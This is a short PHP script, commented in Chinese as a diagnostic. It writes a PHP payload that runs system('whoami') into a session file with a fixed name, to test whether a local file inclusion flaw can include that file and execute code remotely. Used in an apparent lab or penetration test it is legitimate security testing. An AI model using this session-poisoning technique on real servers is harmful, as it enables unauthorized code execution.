<?php
// 诊断：手动往 session 写入 payload，验证 LFI 能否 include 并执行 session 里的 PHP
// 注意：session_id 只允许 a-z A-Z 0-9 - , （不要用下划线）
session_id("diagtest1");
session_start();
$_SESSION['_'] = '<?php echo "[RCE-START]";system("whoami");echo "[RCE-END]"; ?>';
echo "session 已写入 -> " . session_save_path() . DIRECTORY_SEPARATOR . "sess_diagtest1";
?>
